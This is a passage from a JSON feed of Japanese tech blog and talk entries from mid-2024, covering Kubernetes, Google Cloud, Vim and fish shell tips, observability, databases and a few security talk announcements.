発表文字起こし：https://findy-code.io/engineer-lab/dev-productivity-con-2024-3shake","isoDate":"2024-06-28T04:00:00.000Z","dateMiliSeconds":1719547200000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"運用者の各領域で向き合うLLM","link":"https://speakerdeck.com/nwiizo/yun-yong-zhe-noge-ling-yu-dexiang-kihe-ullm","contentSnippet":"運用者の各領域で向き合うLLM というタイトルで登壇しました。\\r\\rイベント名: Cloud Operator Days Tokyo 2024 \\rイベントURL:https://cloudopsdays.com/","isoDate":"2024-06-28T04:00:00.000Z","dateMiliSeconds":1719547200000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"おまえらのFizzBuzzは間違っている(Go オブジェクト指向)","link":"https://zenn.dev/kamos/articles/ce9ff83b90abbc","contentSnippet":"はじめに釣りタイトルですまん。この記事は社内勉強会向けに作成した内容をZenn向けに再編集したものです。ソースコードhttps://github.com/Mkamono/objective-fizz-buzz 種本「ちょうぜつソフトウェア設計入門 PHPで理解するオブジェクト指向の活用」の5-3を参考にしました。https://amzn.asia/d/ewM0dJ1 突然ですが、FizzBuzzを書いてみてくださいはい。頑張ってください。要求は以下のとおりです。1以上の整数値が入力として渡される3の倍数のときは\\"Fizz\\"と出力する5の倍数のときは\\"B...","isoDate":"2024-06-25T14:10:37.000Z","dateMiliSeconds":1719324637000,"authorName":"Makoto Kamono","authorId":"kamono"},{"title":"ReckonerとATBeX Service LinkのGCP接続を検証してみた","link":"https://sreake.com/blog/reckoner-atbex-service-link-gcp/","contentSnippet":"はじめに Sreake事業部のsatokenです。 普段はお客様向けのSRE案件も担当していますが、弊社SaaSのReckonerのSREも兼務しています。 これまでReckonerからDataソースにアクセスするときは […]The post ReckonerとATBeX Service LinkのGCP接続を検証してみた first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-06-25T07:15:31.000Z","dateMiliSeconds":1719299731000,"authorName":"Sreake","authorId":"Sreake"},{"title":"SKKの接頭辞・接尾辞変換をvim-skk/skkeletonに追加した","link":"https://blog.atusy.net/2024/06/21/skkeleton-affix/","contentSnippet":"Vim駅伝の2024/6/21の記事です。SKKは快適な日本語入力を実現する素敵なインプットメソッドです。WindowsやmacOSなどOS本体向けの実装もあるのですが、Vim向けにもskkeletonやtusskといった実装があります。ddskkです。","isoDate":"2024-06-21T00:00:00.000Z","dateMiliSeconds":1718928000000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Packer + Ansible で ftp-server: No such file or directory でコケたら","link":"https://qiita.com/yteraoka/items/9576de9392fc5db6053a","contentSnippet":"事象久々に packer + ansible で AWS の AMI を作成しようとしたら次のようなエラーでコケてしまいました。fatal: [default]: UNREACHABLE! =>…","isoDate":"2024-06-19T15:32:52.000Z","dateMiliSeconds":1718811172000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"[Kubecon EU 2024: Cloud Native AI Day]Reducing Cross-Zone Egress at Spotify with Custom gRPC Load Balancing のご紹介","link":"https://sreake.com/blog/kubecon-eu-2024-cloud-native-ai-dayreducing-cross-zone-egress-at-spotify-with-custom-grpc-load-balancing/","contentSnippet":"はじめに こんにちは、Sreake事業部の永瀬滉平です！ 今回はKubeCon EU 2024に参加してきましたので、中でも気になったセッションをピックアップしてご紹介したいと思います。 セッションについて 取り上げるセ […]The post [Kubecon EU 2024: Cloud Native AI Day]Reducing Cross-Zone Egress at Spotify with Custom gRPC Load Balancing のご紹介 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-06-19T01:18:15.000Z","dateMiliSeconds":1718759895000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Taskfileを有効活用して、Makefileのシェル芸から逃げる","link":"https://zenn.dev/kamos/articles/fc94a7e73a9ad5","contentSnippet":"はじめに皆さん、Makefileは使っていらっしゃるでしょうか？Makefileは、ソフトウェアのビルドプロセスを自動化するための設定ファイルです。主にUNIX系OSで使用され、プログラムのコンパイル、リンク、インストールなどの手順を記述することで、簡単に実行できます。今回はBetter MakefileとしてTaskfileを紹介したいと思います。!Makefileはmakeコマンドによって実行されるファイルのことを指します。この記事では簡単のため、makeコマンドとMakefileを区別せず、ほぼすべての部分でMakefileと記載します。Taskfileもtaskコ...","isoDate":"2024-06-15T07:41:22.000Z","dateMiliSeconds":1718437282000,"authorName":"Makoto Kamono","authorId":"kamono"},{"title":"KubernetesにおけるCELの記述方法まとめ","link":"https://sreake.com/blog/kubernetes-cel-description/","contentSnippet":"はじめに Kubernetes 1.30でValidating Admission Policyの機能がGAするなど、開発中の新機能にCELが組み込まれるケースが増えています。今後Kubernetesで使われる機会が増え […]The post KubernetesにおけるCELの記述方法まとめ first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-06-12T03:33:38.000Z","dateMiliSeconds":1718163218000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Vimのj/kを加速させるサブモード","link":"https://blog.atusy.net/2024/06/12/vim-submode-jjjj/","contentSnippet":"Vim駅伝の2024/6/12の記事です。Vimmerならついなんとはなしにj/kしちゃうこともありますし、<C-D>とか使いなよと分かってても長距離j/kしちゃうこともありますよね。ryhsd/accelerated-jkがあります。","isoDate":"2024-06-12T00:00:00.000Z","dateMiliSeconds":1718150400000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Google CloudのRapid evaluation APIを利用したLLMの評価手法","link":"https://sreake.com/blog/google-cloud-rapid-evaluation-api-verification/","contentSnippet":"1. はじめに はじめまして、Sreake事業部の井上 秀一です。私はSreake事業部にて、SREや生成AIに関するResearch & Developmentを行っています。 本記事では、LLMの評価手法とし […]The post Google CloudのRapid evaluation APIを利用したLLMの評価手法 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-06-10T09:31:15.000Z","dateMiliSeconds":1718011875000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Google Cloud主催パートナー向けイベントで「Google Cloud で利用できるRDBのベクトル検索を徹底解剖！」を話しました。","link":"https://zenn.dev/nnaka2992/articles/compare_vector_searches_on_google_clouds_rdb","contentSnippet":"2024年6月5日にGoogle Cloudがパートナー向けに開催したデータ関連の非公開イベントで「Google Cloud で利用できるRDBのベクトル検索を徹底解剖！」というLTを話しました。https://speakerdeck.com/nnaka2992/google-cloud-deli-yong-dekirurdbnobekutorujian-suo-woche-di-jie-pou非公開イベントのため録画がなかったり、LT枠だった関係で省略してしまった部分があったりしたためブログでより詳細な説明資料のようなものを書きました。 背景Google Cloudが提供する...","isoDate":"2024-06-09T22:00:00.000Z","dateMiliSeconds":1717970400000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"k6導入 ～ k6 browserでE2Eテストまでにやってきたことのまとめ","link":"https://zenn.dev/melanmeg/articles/78df5703c9da2b","contentSnippet":"はじめにzenn初めてみました✋スカイウイルでインフラエンジニアをしております。案件でk6の調査/実装をする機会があったのでまとめてみました。中でもk6 browserは実験的なモジュールということもあってか関連する記事が少ないため、今回の記事が役に立てればと思います。 k6とはパフォーマンステストおよび負荷テストのためのオープンソースツールであり、Webアプリのパフォーマンスを評価するために利用できます。https://k6.io/docs/以下のような特徴があります並列実行が可能JavaScriptでテストシナリオを記述CLI外部統合の容易さグラフ...","isoDate":"2024-06-09T06:20:45.000Z","dateMiliSeconds":1717914045000,"authorName":"Naoya Yamamoto","authorId":"melanmeg"},{"title":"可観測性ガイダンス","link":"https://speakerdeck.com/nwiizo/ke-guan-ce-xing-kaitansu","contentSnippet":"可観測性ガイダンスというタイトルで登壇してきました。\\r\\rイベント名: オブザーバビリティ再入門 - 大切さと高め方を知ろう！\\rイベントURL: https://mackerelio.connpass.com/event/316449/\\r\\r\\r# ブログでいくつかの可観測性に関する書籍のまとめを投稿しました。\\r5年後には標準になっている可観測性のこと - Learning Opentelemetry の読書感想文\\rhttps://syu-m-5151.hatenablog.com/entry/2024/04/16/180511\\r\\rもう一度読むObservability Engineering\\rhttps://syu-m-5151.hatenablog.com/entry/2024/05/06/090014\\r\\r盲目的に始めないためのオブザーバビリティ実践ガイド - Cloud Observability in Actionの読書感想文\\rhttps://syu-m-5151.hatenablog.com/entry/2024/05/10/121047","isoDate":"2024-06-04T04:00:00.000Z","dateMiliSeconds":1717473600000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"SREに求められるスキルと心構え","link":"https://sreake.com/blog/sre-required-skills-and-mindset/","contentSnippet":"はじめに こんにちは、最近の私の人生はキックボクシングとコーディングの2つの活動に極端に偏りつつあります。nwiizoです。一見正反対のようなこの2つの活動ですが、共通する本質があります。それは、頭で考えるだけでなく、実 […]The post SREに求められるスキルと心構え first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-06-03T01:56:04.000Z","dateMiliSeconds":1717379764000,"authorName":"Sreake","authorId":"Sreake"},{"title":"gh searchでOSS貢献を振り替える","link":"https://blog.atusy.net/2024/06/03/gh-search-merged-prs/","contentSnippet":"ghコマンド、ベンリですね。こんな感じで、公開レポジトリに作ったPRの内、マージされたものを一発で集計できちゃいます。今のところ、59レポジトリに167PRをマージしてもらったみたいです。","isoDate":"2024-06-03T00:00:00.000Z","dateMiliSeconds":1717372800000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Remixでフロントエンド入門してみた","link":"https://blog.atusy.net/2024/06/03/remix-beginner/","contentSnippet":"ぼちぼちフロントエンドなるもんもやってみたいなーと思い、Remixに入門してみました。フロントエンドの経験は、仕事でちょっとVue2を触ったことがあるのと、3年ほど前にReactのチュートリアルをやったことがあるくらい。特に拘りはなく、同僚がおすすめしてたRemixに手を出してみることにしました。","isoDate":"2024-06-03T00:00:00.000Z","dateMiliSeconds":1717372800000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"fishの起動時間","link":"https://blog.atusy.net/2024/06/02/fish-startuptime/","contentSnippet":"fishの起動時間はfish -i -c \\"fish_prompt; exit 0\\"の実行時間で測るとよさそうです。-iオプションにより設定ファイルの実行時間を含む-cオプションにfish_promptを呼ぶことでプロンプトの決定にかかる時間を含むコマンドのベンチマークに便利なhyperfineを使うとこんな感じ。平均45.8msとのことで、十分に高速かと思います。","isoDate":"2024-06-02T00:00:00.000Z","dateMiliSeconds":1717286400000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"fishでzshのhistoryも参照したい","link":"https://blog.atusy.net/2024/05/30/fish-history/","contentSnippet":"先日、fish使い始めたとの話をしたところですが、移行にあたり、Zshのコマンド履歴を使えないことが苦痛になりました。そんな時も、さっと設定できちゃうFishはステキ。~/.zsh_history）と、Fishのコマンド履歴（historyコマンドの出力）を合体させて、fzfで選択すれば両方の履歴を使えます。","isoDate":"2024-05-30T00:00:00.000Z","dateMiliSeconds":1717027200000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"H/LとPageUp/PageDownを共存させる設定 (submode編)","link":"https://blog.atusy.net/2024/05/29/vim-hl-enhanced/","contentSnippet":"この記事は、Vim駅伝の2024年5月29日の記事です。22日の記事でH/LとPageUp/PageDownを共存させる設定の紹介がありました。https://zenn.dev/vim_jp/articles/20240522_ekiden_better_hlHとLは通常では、表示領域内の最初の行や最後の行にカーソルを移動させるコマンドです。連打しやすい割に、連打する意味がない、惜しい存在ですが、スクロール機能も持たせるのは良いアイデアですね。","isoDate":"2024-05-29T00:00:00.000Z","dateMiliSeconds":1716940800000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"fish使い始めた","link":"https://blog.atusy.net/2024/05/27/fish/","contentSnippet":"長く、Zshを使っていましたが、Fishに移行しました。ノープラグインでOKなくらい高機能で工夫せずとも20msで起動するのは快適でいいです。ネット上のコマンドをコピペした時もそんなに込まらなさそう。","isoDate":"2024-05-27T00:00:00.000Z","dateMiliSeconds":1716768000000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Cloud SQL for PostgreSQLのベクトル検索を試す","link":"https://zenn.dev/nnaka2992/articles/play_with_cloud_sql_vector_search","contentSnippet":"Google Cloud Next \'24でGoogle Cloudが提供するすべてのマネージドデータベースにベクトル検索の機能が追加されました。[1]今回はそのなかのCloud SQL for PostgreSQLにフォーカスしてベクトル検索機能を試します。 Cloud SQL for PostgreSQL インスタンススペックエディションEnterprisevCPU2RAM8GBストレージタイプSSDZoneasia-northeast1接続パブリックIPを有効化 必要な設定を行うデータベースを作成す...","isoDate":"2024-05-26T15:54:14.000Z","dateMiliSeconds":1716738854000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"Geminiはトーク分析ツールに取って代わるか","link":"https://sreake.com/blog/gemini-talk-analysis/","contentSnippet":"はじめに 初めまして、Sreake事業部アプリケーション開発支援チームの大美です。 先日、Googleのマルチモーダル生成AIモデル Gemini 1.5 Pro のコンテキストウィンドウが100万→200万トークンにア […]The post Geminiはトーク分析ツールに取って代わるか first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-05-24T10:28:39.000Z","dateMiliSeconds":1716546519000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Google Cloudのプロンプト比較機能を用いた、言語モデルにおけるプロンプト設計","link":"https://sreake.com/blog/google-cloud-prompt-design/","contentSnippet":"1. はじめに はじめまして、Sreake事業部の井上 秀一です。私はSreake事業部にて、SREや生成AIに関するResearch & Developmentを行っています。 本記事では、Google Clo […]The post Google Cloudのプロンプト比較機能を用いた、言語モデルにおけるプロンプト設計 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-05-24T09:52:32.000Z","dateMiliSeconds":1716544352000,"authorName":"Sreake","authorId":"Sreake"},{"title":"セキュリティ人材になるために/becoming a security personnel","link":"https://speakerdeck.com/moz_sec_/becoming-a-security-personnel","contentSnippet":"2024年5月23日に行われたランチタイムトークで登壇した資料です。","isoDate":"2024-05-23T04:00:00.000Z","dateMiliSeconds":1716436800000,"authorName":"Kobayashi Shun","authorId":"moz-sec"},{"title":"Kubernetes Code Contribution入門","link":"https://speakerdeck.com/bells17/kubernetes-code-contributionru-men","contentSnippet":"Kubernetes Novice Tokyo #32 で登壇したセッションの資料です。\\rhttps://k8s-novice-jp.connpass.com/event/317561/\\r\\r配信URL:\\rhttps://www.youtube.com/live/sRLG9ufaZ4M","isoDate":"2024-05-21T04:00:00.000Z","dateMiliSeconds":1716264000000,"authorName":"bells17","authorId":"bells17"},{"title":"サイバーセキュリティの最新動向：脅威と対策","link":"https://speakerdeck.com/kyohmizu/saibasekiyuriteinozui-xin-dong-xiang-xie-wei-todui-ce","contentSnippet":"セミナー登壇資料です。2024/05/21\\rhttps://pages.securify.jp/event-seminar-20240521.html","isoDate":"2024-05-21T04:00:00.000Z","dateMiliSeconds":1716264000000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"Neovimの端っこで\\\\<C-W\\\\>lとかしたら、WeztermのとなりのPaneに移動する","link":"https://blog.atusy.net/2024/05/21/move-nvim-win-or-wezterm-pane/","contentSnippet":"Weztermで区切ったPaneの中でNeovimを操作していると、<c-w>lしたのに隣に移動できないぞ？という気分になるときがあります。右隣はNeovimのWindowではなく、WeztermのPaneですね。","isoDate":"2024-05-21T00:00:00.000Z","dateMiliSeconds":1716249600000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Oracle Dataabse 19cの検証環境が欲しいからProxmoxに環境構築する","link":"https://zenn.dev/nnaka2992/articles/install_oracle_19c_to_proxmox","contentSnippet":"概要300年ぶりぐらいに、ローカル環境(非Cloud環境)でホストしたOracle Databaseが欲くなったので、自宅にあるProxmoxへインストールします。 前提Proxmoxにダウンロード済みのOracle Linux 9のイメージを利用する。利用するOracle Databaseは19cとする。検証環境のため本番用途に適した設定ではない。 Proxmox VMを建ち上げる Oracle Database 19cのサーバ要件今回関係あるもののみ抜粋しています。OSOracle Linux 9およびRed Hat互換カーネル: 5.14.0-...","isoDate":"2024-05-19T14:18:18.000Z","dateMiliSeconds":1716128298000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"Pulumi コマンド を GitHub Actions で実行する","link":"https://zenn.dev/z63d/articles/0d6b3ee4e9a44e","contentSnippet":"背景副業で Pulumi を使っています。プロバイダーなどのパッケージのバージョン更新をサボっていたのですが、対応しようと思い Renovate で更新するようにしました。しかし、PR が来た時点では Pulumi の差分が分かりません。ローカルで pulumi preview を実行して差分がないことを毎回確認するのは面倒なので GitHub Actions で pulumi preview を実行して PR のコメントで差分を表示してもらうことにしました。 環境Pulumi CloudPulumi + TypeScriptGoogle Cloud 実装していく...","isoDate":"2024-05-18T05:30:31.000Z","dateMiliSeconds":1716010231000,"authorName":"Kaita Nakamura","authorId":"kaita-nakamura"},{"title":"CloudSQL for PostgreSQLのベンチマークと比較して理解するAlloyDBの特徴","link":"https://zenn.dev/nnaka2992/articles/compare_alloydb_and_postgres","contentSnippet":"概要Google Cloudが提供するPostgreSQL互換データベースであるAlloyDBのパフォーマンスをトランザクション用途・分析用途の双方から検証する。今回の検証ではAlloyDBの上限を見定めるのではなく、CloudSQLと比べてどのようなパフォーマンスになるを目的とする。 TL;DR絞り込み条件がインデックスに限定されない場合、AlloyDBのパフォーマンスメリットが特に大きくなる。絞り込み条件がインデックスに限定され、かつデータサイズが小さい場合、CloudSQL for PostgreSQLのコストパフォーマンスが大きくなる。現将・将来のワークロード...","isoDate":"2024-05-17T15:16:13.000Z","dateMiliSeconds":1715958973000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"[Kubernetes 1.30] kube-proxy の nftables モード","link":"https://zenn.dev/toversus/articles/dcb888d73f0615","contentSnippet":"kube-proxyService へのトラフィックをプロキシするコンポーネントのデフォルト実装e.g.) Cluster IP への通信を Pod IP にリダイレクトするEndpointSlice, Service, Node などのオブジェクトの変更を検知して Service を介したトラフィックのルーティングを可能にするContainer Network Interface (CNI) vs kube-proxyCNI が Pod 間で通信できるように Pod IP の払い出しやルーティングをセットアップするPod は一時的なものかつ Pod ...","isoDate":"2024-05-16T23:43:33.000Z","dateMiliSeconds":1715903013000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"Cloud SQL(MySQL)とSpring Bootの画像検索アプリケーション作成","link":"https://sreake.com/blog/cloudsql-spring-boot-image-search-app/","contentSnippet":"はじめに Google Cloud Next ’24 にて Cloud SQL for MySQL にて Embedding データを入れられるようになったというアナウンスが有りました。 https://cl […]The post Cloud SQL(MySQL)とSpring Bootの画像検索アプリケーション作成 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-05-15T00:02:44.000Z","dateMiliSeconds":1715731364000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Posit Table Contestに`felp::fuzzyhelp()`を投稿した","link":"https://blog.atusy.net/2024/05/13/posit-table-contest/","contentSnippet":"RStudio IDEを開発するPosit PBCがTable Contest: 2024 Editionを開催しています。表を使ったデータの可視化の例を思い思いに投稿してもらい、その中から受賞者を決めて、Tシャツやマグカップなどのノベルティを進呈するプログラムのようです。polarsパッケージを使って投稿した人には特別な受賞枠もあるようです。2022年にも同様のコンテストがありましたが、今年はR言語に限らず、Python言語を使っての投稿もOKとのこと。","isoDate":"2024-05-13T00:00:00.000Z","dateMiliSeconds":1715558400000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Dev ContainersとTestcontainers","link":"https://speakerdeck.com/bells17/devcontainerstotestcontainers","contentSnippet":"TechFeed Experts Night#28 〜 コンテナ技術最前線 〜で登壇したセッションの資料です。\\rhttps://techfeed.io/events/techfeed-experts-night-28","isoDate":"2024-05-08T04:00:00.000Z","dateMiliSeconds":1715140800000,"authorName":"bells17","authorId":"bells17"},{"title":"OpenTelemetryによる計装とOpenTelemetry Collectorについて調べてみた","link":"https://sreake.com/blog/opentelemetry-instrumentation/","contentSnippet":"はじめに はじめまして、スリーシェイクインターン生の有馬祐二と関根弘晃です。私たちは2024年3月18日～3月29日に開催された短期インターンシップに参加しました。私たちのグループではインターンの期間でテレメトリデータの […]The post OpenTelemetryによる計装とOpenTelemetry Collectorについて調べてみた first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-05-07T01:32:46.000Z","dateMiliSeconds":1715045566000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Ciliumのkube-proxy置き換えに関する調査 ~ GKE Dataplane V1・V2 の比較 ~","link":"https://sreake.com/blog/cilium-kube-proxy-replacement/","contentSnippet":"自己紹介 小林 インターン生のの小林です。大学では、ネットワーク系の研究を行っています。もともとセキュリティやネットワークに興味があり、SREやインフラ領域のスキル向上になると思い、本インターンに参加しました。 中村 イ […]The post Ciliumのkube-proxy置き換えに関する調査 ~ GKE Dataplane V1・V2 の比較 ~ first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-05-05T23:59:27.000Z","dateMiliSeconds":1714953567000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Pulumi ESC を使ってみる","link":"https://zenn.dev/z63d/articles/496f787cda423c","contentSnippet":"概要Pulumi ESC (Environments, Secrets, and Configuration)クラウドインフラとアプリケーションの secret と configuration を管理できるPulumi Cloud で利用可能なマネージドサービス2023/10 にリリース現在はプレビュー段階 ドキュメントに記載されている内容をざっくり要約Pulumi ESC はクラウド環境における secret と configuration の複雑さに対処し、メンテナンスの負担を軽減し、コストのかかるミスを減らし、「secure by default」な体制を構...","isoDate":"2024-05-05T04:36:28.000Z","dateMiliSeconds":1714883788000,"authorName":"Kaita Nakamura","authorId":"kaita-nakamura"},{"title":"【2024年夏期インターン】SREの技術について学びたいインターン募集！","link":"https://sreake.com/blog/summer_intern/","contentSnippet":"リモートで開催する2週間程度で、技術に関する研究を行うインターンシッププログラムとなっています！当社SREエンジニアがメンターとしてサポートし、知識に不安をお持ちの方のために事前学習の期間を設けておりますので、インフラ、 […]The post 【2024年夏期インターン】SREの技術について学びたいインターン募集！ first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-05-01T03:27:01.000Z","dateMiliSeconds":1714534021000,"authorName":"Sreake","authorId":"Sreake"},{"title":"スリーシェイク、 Google Cloud Infrastructure Modernization 支援パートナープログラムに賛同","link":"https://sreake.com/blog/gcim/","contentSnippet":"株式会社スリーシェイク（本社：東京都新宿区、代表取締役社長：吉田 拓真、以下スリーシェイク）は、 クラウドへのインフラストラクチャ移行を支援する Google Cloud Infrastructure Moderniza […]The post スリーシェイク、 Google Cloud Infrastructure Modernization 支援パートナープログラムに賛同 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-04-30T07:15:12.000Z","dateMiliSeconds":1714461312000,"authorName":"Sreake","authorId":"Sreake"},{"title":"[Kubernetes 1.30] Dynamic Resource Allocation の再構築","link":"https://zenn.dev/toversus/articles/5bbd68e507f28d","contentSnippet":"!Kubernetes 1.30 時点でアルファ機能のため、実装が大きく変わる可能性があります。[Kubernetes 1.27] Dynamic Resource Allocation のいまで紹介した Dynamic Resource Allocation (DRA) の内部的な仕組みに Kubernetes 1.30 で大きく変更が入ることになりました。内部的な仕組みの変更なので、ユーザー視点ではこれまでと利用方法は変わりません。ResourceClass に追加されたフィールドを有効にしないと新しい仕組みが使えないため、クラスタ管理者は対応が必要になります。世界的に AI...","isoDate":"2024-04-30T06:43:41.000Z","dateMiliSeconds":1714459421000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"WireGuard Exporter と Grafana Alloy で VPN 通信量を可視化","link":"https://blog.1q77.com/2024/04/wireguard-exporter/","contentSnippet":"先日、家のラズパイに Grafana Alloy をセットアップしてメトリクス可視化の環境はできているので WireGuard での VPN 通信のメトリクスを可視化してみようかなと試してみました。","isoDate":"2024-04-28T12:57:31.000Z","dateMiliSeconds":1714309051000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"見て見ぬふりをしない、権限とWorkload Identity(Google Cloud)","link":"https://zenn.dev/kamos/articles/92a8125dc3adac","contentSnippet":"はじめにGoogle Cloudを使う際、最も頻繁に遭遇するエラーは「権限が足りない」というものでした。特に新しいプロジェクトを立ち上げ、CI/CDの構築に取り組む際にこのエラーに何度も直面し、時間を浪費してしまいました。この経験から、Google Cloudの権限管理を深く知ることが重要であると痛感しました。そこで、体系的にGoogle Cloudの権限管理を学び、その成果をこの記事でわかりやすく共有したいと思います。 この記事を読んでほしい人Google Cloudにおける権限、ロール、プリンシパル、ポリシーの意味と関係性を説明できない人Workload Ident...","isoDate":"2024-04-27T16:53:02.000Z","dateMiliSeconds":1714236782000,"authorName":"Makoto Kamono","authorId":"kamono"},{"title":"Istio Ambient Mesh の inpod redirection 試してみた","link":"https://sreake.com/blog/istio-ambient-mesh-inpod-redirection/","contentSnippet":"先日Istio 1.21.0がリリースされ ambient meshにinpod redirectionが実装されました。（ambient meshはまだalphaなので本番環境では非推奨です） inpod redire […]The post Istio Ambient Mesh の inpod redirection 試してみた first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-04-23T06:05:05.000Z","dateMiliSeconds":1713852305000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Dev Containerを使ってみよう","link":"https://zenn.dev/bells17/articles/devcontainer-2024","contentSnippet":"Dev Containerを使ってみようDev Containerを使う上で知っておくと良さげな情報のまとめ記事です前にRemote SSHでDev Containerの環境を構築する記事を書いたので、今回はDev Container全般の情報をまとめてみましたhttps://zenn.dev/bells17/articles/remote-ssh-devcontainer tl;drDev Containerを使うと開発環境をコンテナで構築できるよ(ランタイムとかツール類含めて！)docker composeだとアプリケーションを動作させる環境は作れるけどDev C...","isoDate":"2024-04-22T18:05:48.000Z","dateMiliSeconds":1713809148000,"authorName":"bells17","authorId":"bells17"},{"title":"「セキュリティ・キャンプ全国大会2024」にスリーシェイクのエンジニアが講師として登壇","link":"https://sreake.com/blog/security/","contentSnippet":"株式会社スリーシェイク（本社：東京都新宿区、代表取締役社長：吉田 拓真、以下スリーシェイク）に在籍するエンジニアが、独立行政法人情報処理推進機構と一般社団法人セキュリティ・キャンプ協議会が共催する「セキュリティ・キャンプ […]The post 「セキュリティ・キャンプ全国大会2024」にスリーシェイクのエンジニアが講師として登壇 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-04-22T01:07:46.000Z","dateMiliSeconds":1713748066000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Google Cloud Next ‘24 参加レポート","link":"https://sreake.com/blog/google-cloud-next-24-report/","contentSnippet":"参加レポート タイトルの通りラスベガスにて4/9から11まで開催されていた Google Cloud Next’24 に参加してきました。 今回は Google Cloud Partner Top Engineer 20 […]The post Google Cloud Next ‘24 参加レポート first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-04-17T23:00:00.000Z","dateMiliSeconds":1713394800000,"authorName":"Sreake","authorId":"Sreake"},{"title":"[EKS] Amazon Linux 2023 への移行","link":"https://zenn.dev/toversus/articles/a4bbd2047bbba1","contentSnippet":"2024/2/29 に Amazon Linux 2023 が EKS で正式サポートされました。全てのリージョンの Karpenter Node、マネージドノードグループ、セルフマネージドノードグループで利用可能です。現在 EKS でサポート対象の 1.25 以降に加えて、延長サポートに入っている EKS 1.23 / 1.24 でも利用できます。Amazon Linux 2023 のサポートに関しては Amazon EKS-Optimized Amazon Linux 2023 AMIs Now Available のブログに詳細がまとまっています。 セキュリティ機能の強化Am...","isoDate":"2024-04-17T00:22:38.000Z","dateMiliSeconds":1713313358000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"コンテナセキュリティの基本と脅威への対策","link":"https://speakerdeck.com/kyohmizu/kontenasekiyuriteinoji-ben-toxie-wei-henodui-ce","contentSnippet":"「Offers - 何から始める？脅威から考えるコンテナセキュリティのベストプラクティス」の登壇資料です。2024/04/16\\rhttps://offers.connpass.com/event/314412/","isoDate":"2024-04-16T04:00:00.000Z","dateMiliSeconds":1713240000000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"Grafana Alloy でメトリクス収集","link":"https://blog.1q77.com/2024/04/grafana-alloy/","contentSnippet":"Raspberry Pi を新しくしてからメトリクスの可視化を行っていなかったので Grafana Cloud で見れるようにセットアップしようと Grafana のサイトを見ていたら Alloy というものの存在を知ったので試してみる。","isoDate":"2024-04-15T15:16:09.000Z","dateMiliSeconds":1713194169000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"[Kubecon EU 2024: Cloud Native AI Day] Pods Everywhere! InterLink: A Virtual Kubelet Abstraction Streamlining HPC Resource Exploitation の紹介","link":"https://sreake.com/blog/kubecon-eu-2024-pods-everywhere-interlink-a-virtual-kubelet-abstraction-streamlining-hpc-resource-exploitation/","contentSnippet":"はじめに INFNというイタリア国立核物理学研究所のメンバーであるディエゴさんが、「パブリッククラウド、オンプレミスの異種シミュレーション環境において、インターフェースの統一を目的としたプロジェクト」の紹介をするセッショ […]The post [Kubecon EU 2024: Cloud Native AI Day] Pods Everywhere! InterLink: A Virtual Kubelet Abstraction Streamlining HPC Resource Exploitation の紹介 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-04-08T03:46:21.000Z","dateMiliSeconds":1712547981000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Shinyをバックグラウンドで起動する","link":"https://blog.atusy.net/2024/04/01/shiny-as-background-process/","contentSnippet":"先週、felp v0.4.0をリリースしました。このパッケージはShinyを使っていて、felp::fuzzyhelp()を実行すると、以下のように、ヘルプをあいまい検索できます。1からも起動できます。","isoDate":"2024-04-01T00:00:00.000Z","dateMiliSeconds":1711929600000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"PGUnconf #46 でPostgreSQL の開発するときにまず何からすればいいかを聞いてきた","link":"https://nnaka2992.hatenablog.com/entry/zatu/20240323_pgunconf.md","contentSnippet":"PGUnconf #46 でPostgreSQL の開発するときにまず何からすればいいかを聞いてきた概要2024年3月23日に第46回 